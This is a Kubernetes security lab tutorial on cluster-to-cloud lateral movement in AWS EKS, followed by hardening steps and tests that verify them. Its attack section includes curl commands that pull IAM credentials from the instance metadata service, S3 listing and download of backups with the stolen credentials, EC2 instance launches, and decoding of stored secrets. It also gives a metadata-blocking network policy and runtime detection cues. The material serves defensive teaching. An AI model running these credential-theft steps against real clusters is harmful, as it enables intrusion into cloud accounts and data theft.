# K08: Cluster-to-Cloud Lateral Movement

## Overview:

When Kubernetes is deployed on a cloud platform, workloads often require access to cloud services such as object storage, databases, message queues, or secret management services. This access is typically granted through cloud Identity and Access Management (IAM) roles or credentials.

If a container is compromised, an attacker may abuse these cloud permissions to move beyond the Kubernetes cluster and gain access to cloud resources. This type of attack is known as **Cluster-to-Cloud Lateral Movement**.

Improper IAM configurations, unrestricted access to cloud metadata services, and the use of long-lived cloud credentials significantly increase the impact of a Kubernetes compromise.

---

# Threat Scenario (OWASP):

A company deploys an application on Amazon EKS.

The worker nodes are assigned an IAM role with broad permissions, including:

- Full access to Amazon S3
- Access to Amazon RDS
- Permission to create EC2 instances

The application itself does not require these permissions.

An attacker exploits a vulnerability in one of the application's containers and gains shell access.

The attacker can now:

- Retrieve cloud IAM credentials.
- Access sensitive S3 buckets.
- Read or modify cloud databases.
- Launch new cloud resources.
- Move laterally into the cloud environment.

Although only one Pod was compromised, excessive cloud permissions allow the attacker to compromise the organization's cloud infrastructure.

---

# Part A - Vulnerable Kubernetes Configuration

### Step 1 - Deploy an Application

Create **deployment.yaml**

```yaml
apiVersion: apps/v1
kind: Deployment

metadata:
  name: vulnerable-app
  namespace: default

spec:
  replicas: 1

  selector:
    matchLabels:
      app: vulnerable-app

  template:
    metadata:
      labels:
        app: vulnerable-app

    spec:
      containers:

      - name: app
        image: amazonlinux
        command:
        - sleep
        - "3600"
```

Deploy the application.

Command:

```bash
kubectl apply -f deployment.yaml
```

Verify:

```bash
kubectl get pods
```

### Explanation

The Pod runs on a worker node that inherits the node's IAM permissions.

---

### Step 2 - Access the Container

Command:

```bash
kubectl exec -it <pod-name> -- bash
```

The attacker now has access inside the container.

---

### Step 3 - Access the Cloud Metadata Service

Command:

```bash
curl http://169.254.169.254/latest/meta-data/
```

Example Output

```
iam/

instance-id

hostname

security-credentials/
```

### Explanation

Cloud providers expose an Instance Metadata Service (IMDS) that allows workloads to retrieve information about the underlying virtual machine.

If unrestricted, attackers can query this service.

---

### Step 4 - Retrieve IAM Credentials

Command:

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Example Output

```
WorkerNodeRole
```

Retrieve the temporary credentials.

```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/WorkerNodeRole
```

Example Output

```json
{
  "AccessKeyId":"ASIA********",
  "SecretAccessKey":"********",
  "Token":"********"
}
```

### Explanation

The attacker successfully retrieves temporary cloud credentials assigned to the worker node.

---

# Part B - Attacker Exploitation

### Step 5 - Access Cloud Storage

Using the stolen IAM credentials, the attacker lists cloud storage buckets.

Example:

```bash
aws s3 ls
```

Result

```
company-backups

finance-data

logs
```

### Explanation

The compromised Pod can now access cloud resources outside the Kubernetes cluster.

---

### Step 6 - Read Sensitive Cloud Data

Example:

```bash
aws s3 cp s3://company-backups/database.sql .
```

### Explanation

Sensitive backups can be downloaded if excessive IAM permissions are granted.

---

### Step 7 - Launch Cloud Resources

Example:

```bash
aws ec2 run-instances \
--image-id ami-xxxxxxxx \
--instance-type t2.micro
```

### Explanation

An attacker may create cloud resources to maintain persistence or consume cloud resources.

---

### Step 8 - Static Credential Discovery

Suppose developers stored AWS credentials inside a Kubernetes Secret.

Command:

```bash
kubectl get secret aws-secret -o yaml
```

Decode the secret.

```bash
echo "<base64-value>" | base64 -d
```

### Explanation

Long-lived cloud credentials provide persistent access even after the compromised Pod is deleted.

---

## Observations:

Because cloud permissions are overly permissive, an attacker can:

- Retrieve cloud IAM credentials.
- Access cloud storage services.
- Read sensitive cloud databases.
- Create cloud resources.
- Persist outside the Kubernetes cluster.
- Expand the attack from Kubernetes into the cloud environment.

---

# Part C - Applying Security Controls

### Step 9 - Use Workload Identity

Instead of assigning permissions to worker nodes, assign IAM permissions directly to Kubernetes ServiceAccounts.

Example (AWS IRSA):

```yaml
apiVersion: v1
kind: ServiceAccount

metadata:
  name: my-app-sa
  namespace: default

  annotations:
    eks.amazonaws.com/role-arn: arn:aws:iam::123456789012:role/MyApplicationRole
```

### Explanation

Each application receives only the cloud permissions it requires.

---

### Step 10 - Block Access to the Metadata Service

Create **block-metadata.yaml**

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy

metadata:
  name: block-metadata-access
  namespace: default

spec:

  podSelector: {}

  policyTypes:

  - Egress

  egress:

  - to:

    - ipBlock:

        cidr: 0.0.0.0/0

        except:

        - 169.254.169.254/32
```

Apply:

```bash
kubectl apply -f block-metadata.yaml
```

### Explanation

Pods can no longer communicate with the cloud metadata service.

---

### Step 11 - Avoid Static Credentials

Never store:

- AWS Access Keys
- Azure Service Principal Secrets
- Google Cloud Service Account Keys

Instead use:

- AWS IRSA / EKS Pod Identity
- Azure Workload Identity
- GKE Workload Identity

Short-lived credentials are automatically rotated.

---

### Step 12 - Enable Runtime Security

Deploy runtime security tools such as:

- Falco
- Tetragon

These tools detect suspicious activity including:

- Unexpected shell execution.
- Use of curl inside containers.
- Execution of aws-cli.
- Network scanning.
- Privilege escalation attempts.

---

### Step 13 - Harden Instance Metadata Service

For AWS, enable **IMDSv2**.

This prevents attackers from easily retrieving IAM credentials through the metadata service.

---

# Part D - Verify the Security Controls

### Test 1 - Access Metadata Service

Command:

```bash
curl http://169.254.169.254/latest/meta-data/
```

Result

```
Connection timed out
```

The Network Policy blocks access to the metadata service.

---

### Test 2 - Verify Workload Identity

Command:

```bash
kubectl describe serviceaccount my-app-sa
```

Result

```
IAM Role:

MyApplicationRole
```

The application uses its own least-privilege IAM role.

---

### Test 3 - Verify Static Credentials

Command:

```bash
kubectl get secrets
```

Result

```
No cloud access keys stored.
```

Applications no longer rely on long-lived credentials.

---

### Test 4 - Verify Runtime Detection

Attempt:

```bash
aws s3 ls
```

or

```bash
curl http://169.254.169.254
```

Result

```
Falco Alert:

Suspicious cloud credential access detected.
```

Runtime monitoring immediately detects unauthorized behavior.

---

## Final Observation

After implementing the recommended security controls:

- Pods use workload-specific cloud identities instead of inheriting node permissions.
- Access to cloud metadata services is blocked.
- Long-lived cloud credentials are eliminated.
- Runtime security tools detect lateral movement attempts.
- Metadata services are hardened using cloud-provider best practices (such as AWS IMDSv2).
- Cloud IAM permissions follow the principle of least privilege.

As a result, compromising a Kubernetes workload no longer provides an attacker with unrestricted access to the underlying cloud environment, significantly reducing the risk of cluster-to-cloud lateral movement.
